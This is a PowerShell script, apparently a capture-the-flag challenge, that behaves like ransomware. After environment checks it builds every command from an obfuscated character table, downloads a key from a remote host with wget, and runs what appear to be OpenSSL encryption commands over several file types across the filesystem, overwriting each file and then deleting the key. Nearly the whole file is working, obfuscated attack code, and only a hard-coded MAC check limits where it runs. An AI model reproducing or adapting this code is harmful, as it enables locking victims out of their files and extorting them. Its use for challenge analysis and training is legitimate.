function Main 
{
    CheckEnvironment
    BuildCharacterDictionary
    DownloadKey
    ProcessEncryptedFiles
    RemoveKey
    exit
}

function CheckEnvironment 
{
    if ([int](&(Get-Command /???/id) -u) -cne -not [bool][byte]){exit}
    if (-not ((cat /etc/*release*) | grep noble)){exit}
    if ((cat /sys/class/net/enp0s3/address) -cne "08:00:27:eb:6b:49"){exit} # intentional guard in chal to prevent accidentally running the script
}

function BuildCharacterDictionary
{
    #$osReleaseLines = (&(Get-Command /???/?at) /etc/*release*).split('\n')
    $osReleaseLines = @(
    'DISTRIB_ID=Ubuntu',
    'DISTRIB_RELEASE=24.04',
    'DISTRIB_CODENAME=noble',
    'DISTRIB_DESCRIPTION="Ubuntu 24.04.2 LTS"',
    'PRETTY_NAME="Ubuntu 24.04.2 LTS"',
    'NAME="Ubuntu"',
    'VERSION_ID="24.04"',
    'VERSION="24.04.2 LTS (Noble Numbat)"',
    'VERSION_CODENAME=noble',
    'ID=ubuntu',
    'ID_LIKE=debian',
    'HOME_URL="https://www.ubuntu.com/"',
    'SUPPORT_URL="https://help.ubuntu.com/"',
    'BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"',
    'PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"',
    'UBUNTU_CODENAME=noble',
    'LOGO=ubuntu-logo'
    )
    #"-./:0123456789=ABCDEGHIKLMNOPRSTUVY_abcdeghilmnoprstuvwy
    $characterArray = ($osReleaseLines[0] += $osReleaseLines[1].split('=')[0] += $osReleaseLines[2] += $osReleaseLines[3].split('=')[0] += $osReleaseLines[4].split('=')[0] += $osReleaseLines[5] += $osReleaseLines[6].split('=')[0] += $osReleaseLines[7].split('=')[0] += $osReleaseLines[8] += $osReleaseLines[9] += $osReleaseLines[10] += $osReleaseLines[11] += $osReleaseLines[12] += $osReleaseLines[13] += $osReleaseLines[14] += $osReleaseLines[15] += $osReleaseLines[16]).Tochararray() + 0..9
    $characterArray = (-join ($characterArray | sort-object | get-unique))
    $Global:CharacterDictionary = $characterArray
}

function DownloadKey 
{
    #/0732/
    $keyUrl = $GLOBAL:CharacterDictionary[3] + $GLOBAL:CharacterDictionary[5] + $GLOBAL:CharacterDictionary[12] + $GLOBAL:CharacterDictionary[8] + $GLOBAL:CharacterDictionary[7] + $GLOBAL:CharacterDictionary[12] + $GLOBAL:CharacterDictionary[1] + $GLOBAL:CharacterDictionary[6] + $GLOBAL:CharacterDictionary[5] + $GLOBAL:CharacterDictionary[12] + $GLOBAL:CharacterDictionary[6] + $GLOBAL:CharacterDictionary[5] + $GLOBAL:CharacterDictionary[14] + $GLOBAL:CharacterDictionary[3] + $GLOBAL:CharacterDictionary[1] + $GLOBAL:CharacterDictionary[3] + $GLOBAL:CharacterDictionary[3] + $GLOBAL:CharacterDictionary[7] + $GLOBAL:CharacterDictionary[13] + 'k' + $GLOBAL:CharacterDictionary[41] + $GLOBAL:CharacterDictionary[56]
    $outputFile = $GLOBAL:CharacterDictionary[16]
    wget $keyUrl -q -O $outputFile
}

function ProcessEncryptedFiles
{
    foreach ($encryptedFile in (Invoke-Expression ('f' + $GLOBAL:CharacterDictionary[44] + $GLOBAL:CharacterDictionary[47] + $GLOBAL:CharacterDictionary[40] + ' ' + $GLOBAL:CharacterDictionary[13] + $GLOBAL:CharacterDictionary[48] + $GLOBAL:CharacterDictionary[49] + $GLOBAL:CharacterDictionary[52] + $GLOBAL:CharacterDictionary[13] + ' ' + $GLOBAL:CharacterDictionary[11] + $GLOBAL:CharacterDictionary[52] + $GLOBAL:CharacterDictionary[56] + $GLOBAL:CharacterDictionary[49] + $GLOBAL:CharacterDictionary[41] + ' ' + 'f')))
    {
        Invoke-Expression ("" + $GLOBAL:CharacterDictionary[48] + $GLOBAL:CharacterDictionary[49] + $GLOBAL:CharacterDictionary[41] + $GLOBAL:CharacterDictionary[47] + $GLOBAL:CharacterDictionary[51] + $GLOBAL:CharacterDictionary[51] + $GLOBAL:CharacterDictionary[45] + ' ' + $GLOBAL:CharacterDictionary[41] + $GLOBAL:CharacterDictionary[47] + $GLOBAL:CharacterDictionary[39] + ' ' + $GLOBAL:CharacterDictionary[11] + $GLOBAL:CharacterDictionary[37] + $GLOBAL:CharacterDictionary[41] + $GLOBAL:CharacterDictionary[51] + $GLOBAL:CharacterDictionary[11] + $GLOBAL:CharacterDictionary[2] + $GLOBAL:CharacterDictionary[5] + $GLOBAL:CharacterDictionary[6] + $GLOBAL:CharacterDictionary[11] + $GLOBAL:CharacterDictionary[39] + $GLOBAL:CharacterDictionary[38] + $GLOBAL:CharacterDictionary[39] + ' ' + $GLOBAL:CharacterDictionary[11] + $GLOBAL:CharacterDictionary[49] + $GLOBAL:CharacterDictionary[37] + $GLOBAL:CharacterDictionary[51] + $GLOBAL:CharacterDictionary[51] + ' ' + 'f' + $GLOBAL:CharacterDictionary[44] + $GLOBAL:CharacterDictionary[45] + $GLOBAL:CharacterDictionary[41] + $GLOBAL:CharacterDictionary[14] + 'k' + $GLOBAL:CharacterDictionary[41] + $GLOBAL:CharacterDictionary[56] + ' ' + $GLOBAL:CharacterDictionary[11] + $GLOBAL:CharacterDictionary[44] + $GLOBAL:CharacterDictionary[47] + ' ' + " $encryptedFile " + ' ' + $GLOBAL:CharacterDictionary[11] + $GLOBAL:CharacterDictionary[48] + $GLOBAL:CharacterDictionary[53] + $GLOBAL:CharacterDictionary[52] + ' ' + " $encryptedFile ")
    } 

    foreach ($encryptedFile in (Invoke-Expression ('f' + $GLOBAL:CharacterDictionary[44] + $GLOBAL:CharacterDictionary[47] + $GLOBAL:CharacterDictionary[40] + ' ' + $GLOBAL:CharacterDictionary[13] + $GLOBAL:CharacterDictionary[43] + $GLOBAL:CharacterDictionary[48] + $GLOBAL:CharacterDictionary[46] + $GLOBAL:CharacterDictionary[41] + $GLOBAL:CharacterDictionary[13] + ' ' + $GLOBAL:CharacterDictionary[11] + $GLOBAL:CharacterDictionary[52] + $GLOBAL:CharacterDictionary[56] + $GLOBAL:CharacterDictionary[49] + $GLOBAL:CharacterDictionary[41] + ' ' + 'f')))
    {
        Invoke-Expression ("" + $GLOBAL:CharacterDictionary[48] + $GLOBAL:CharacterDictionary[49] + $GLOBAL:CharacterDictionary[41] + $GLOBAL:CharacterDictionary[47] + $GLOBAL:CharacterDictionary[51] + $GLOBAL:CharacterDictionary[51] + $GLOBAL:CharacterDictionary[45] + ' ' + $GLOBAL:CharacterDictionary[41] + $GLOBAL:CharacterDictionary[47] + $GLOBAL:CharacterDictionary[39] + ' ' + $GLOBAL:CharacterDictionary[11] + $GLOBAL:CharacterDictionary[37] + $GLOBAL:CharacterDictionary[41] + $GLOBAL:CharacterDictionary[51] + $GLOBAL:CharacterDictionary[11] + $GLOBAL:CharacterDictionary[2] + $GLOBAL:CharacterDictionary[5] + $GLOBAL:CharacterDictionary[6] + $GLOBAL:CharacterDictionary[11] + $GLOBAL:CharacterDictionary[39] + $GLOBAL:CharacterDictionary[38] + $GLOBAL:CharacterDictionary[39] + ' ' + $GLOBAL:CharacterDictionary[11] + $GLOBAL:CharacterDictionary[49] + $GLOBAL:CharacterDictionary[37] + $GLOBAL:CharacterDictionary[51] + $GLOBAL:CharacterDictionary[51] + ' ' + 'f' + $GLOBAL:CharacterDictionary[44] + $GLOBAL:CharacterDictionary[45] + $GLOBAL:CharacterDictionary[41] + $GLOBAL:CharacterDictionary[14] + 'k' + $GLOBAL:CharacterDictionary[41] + $GLOBAL:CharacterDictionary[56] + ' ' + $GLOBAL:CharacterDictionary[11] + $GLOBAL:CharacterDictionary[44] + $GLOBAL:CharacterDictionary[47] + ' ' + " $encryptedFile " + ' ' + $GLOBAL:CharacterDictionary[11] + $GLOBAL:CharacterDictionary[48] + $GLOBAL:CharacterDictionary[53] + $GLOBAL:CharacterDictionary[52] + ' ' + " $encryptedFile ")
    } 

    foreach ($encryptedFile in (Invoke-Expression ('f' + $GLOBAL:CharacterDictionary[44] + $GLOBAL:CharacterDictionary[47] + $GLOBAL:CharacterDictionary[40] + ' ' + $GLOBAL:CharacterDictionary[13] + $GLOBAL:CharacterDictionary[41] + $GLOBAL:CharacterDictionary[52] + $GLOBAL:CharacterDictionary[39] + $GLOBAL:CharacterDictionary[13] + ' ' + $GLOBAL:CharacterDictionary[11] + $GLOBAL:CharacterDictionary[52] + $GLOBAL:CharacterDictionary[56] + $GLOBAL:CharacterDictionary[49] + $GLOBAL:CharacterDictionary[41] + ' ' + 'f' )))
    {
        Invoke-Expression ("" + $GLOBAL:CharacterDictionary[48] + $GLOBAL:CharacterDictionary[49] + $GLOBAL:CharacterDictionary[41] + $GLOBAL:CharacterDictionary[47] + $GLOBAL:CharacterDictionary[51] + $GLOBAL:CharacterDictionary[51] + $GLOBAL:CharacterDictionary[45] + ' ' + $GLOBAL:CharacterDictionary[41] + $GLOBAL:CharacterDictionary[47] + $GLOBAL:CharacterDictionary[39] + ' ' + $GLOBAL:CharacterDictionary[11] + $GLOBAL:CharacterDictionary[37] + $GLOBAL:CharacterDictionary[41] + $GLOBAL:CharacterDictionary[51] + $GLOBAL:CharacterDictionary[11] + $GLOBAL:CharacterDictionary[2] + $GLOBAL:CharacterDictionary[5] + $GLOBAL:CharacterDictionary[6] + $GLOBAL:CharacterDictionary[11] + $GLOBAL:CharacterDictionary[39] + $GLOBAL:CharacterDictionary[38] + $GLOBAL:CharacterDictionary[39] + ' ' + $GLOBAL:CharacterDictionary[11] + $GLOBAL:CharacterDictionary[49] + $GLOBAL:CharacterDictionary[37] + $GLOBAL:CharacterDictionary[51] + $GLOBAL:CharacterDictionary[51] + ' ' + 'f' + $GLOBAL:CharacterDictionary[44] + $GLOBAL:CharacterDictionary[45] + $GLOBAL:CharacterDictionary[41] + $GLOBAL:CharacterDictionary[14] + 'k' + $GLOBAL:CharacterDictionary[41] + $GLOBAL:CharacterDictionary[56] + ' ' + $GLOBAL:CharacterDictionary[11] + $GLOBAL:CharacterDictionary[44] + $GLOBAL:CharacterDictionary[47] + ' ' + " $encryptedFile " + ' ' + $GLOBAL:CharacterDictionary[11] + $GLOBAL:CharacterDictionary[48] + $GLOBAL:CharacterDictionary[53] + $GLOBAL:CharacterDictionary[52] + ' ' + " $encryptedFile ")
    } 

    foreach ($encryptedFile in (Invoke-Expression ('f' + $GLOBAL:CharacterDictionary[44] + $GLOBAL:CharacterDictionary[47] + $GLOBAL:CharacterDictionary[40] + ' ' + $GLOBAL:CharacterDictionary[13] + $GLOBAL:CharacterDictionary[54] + $GLOBAL:CharacterDictionary[37] + $GLOBAL:CharacterDictionary[50] + $GLOBAL:CharacterDictionary[13] + ' ' + $GLOBAL:CharacterDictionary[11] + $GLOBAL:CharacterDictionary[52] + $GLOBAL:CharacterDictionary[56] + $GLOBAL:CharacterDictionary[49] + $GLOBAL:CharacterDictionary[41] + ' ' + 'f')))
    {
        Invoke-Expression ("" + $GLOBAL:CharacterDictionary[48] + $GLOBAL:CharacterDictionary[49] + $GLOBAL:CharacterDictionary[41] + $GLOBAL:CharacterDictionary[47] + $GLOBAL:CharacterDictionary[51] + $GLOBAL:CharacterDictionary[51] + $GLOBAL:CharacterDictionary[45] + ' ' + $GLOBAL:CharacterDictionary[41] + $GLOBAL:CharacterDictionary[47] + $GLOBAL:CharacterDictionary[39] + ' ' + $GLOBAL:CharacterDictionary[11] + $GLOBAL:CharacterDictionary[37] + $GLOBAL:CharacterDictionary[41] + $GLOBAL:CharacterDictionary[51] + $GLOBAL:CharacterDictionary[11] + $GLOBAL:CharacterDictionary[2] + $GLOBAL:CharacterDictionary[5] + $GLOBAL:CharacterDictionary[6] + $GLOBAL:CharacterDictionary[11] + $GLOBAL:CharacterDictionary[39] + $GLOBAL:CharacterDictionary[38] + $GLOBAL:CharacterDictionary[39] + ' ' + $GLOBAL:CharacterDictionary[11] + $GLOBAL:CharacterDictionary[49] + $GLOBAL:CharacterDictionary[37] + $GLOBAL:CharacterDictionary[51] + $GLOBAL:CharacterDictionary[51] + ' ' + 'f' + $GLOBAL:CharacterDictionary[44] + $GLOBAL:CharacterDictionary[45] + $GLOBAL:CharacterDictionary[41] + $GLOBAL:CharacterDictionary[14] + 'k' + $GLOBAL:CharacterDictionary[41] + $GLOBAL:CharacterDictionary[56] + ' ' + $GLOBAL:CharacterDictionary[11] + $GLOBAL:CharacterDictionary[44] + $GLOBAL:CharacterDictionary[47] + ' ' + " $encryptedFile " + ' ' + $GLOBAL:CharacterDictionary[11] + $GLOBAL:CharacterDictionary[48] + $GLOBAL:CharacterDictionary[53] + $GLOBAL:CharacterDictionary[52] + ' ' + " $encryptedFile ")
    }
}

function RemoveKey
{
    Remove-Item $GLOBAL:CharacterDictionary[16]
}


Main
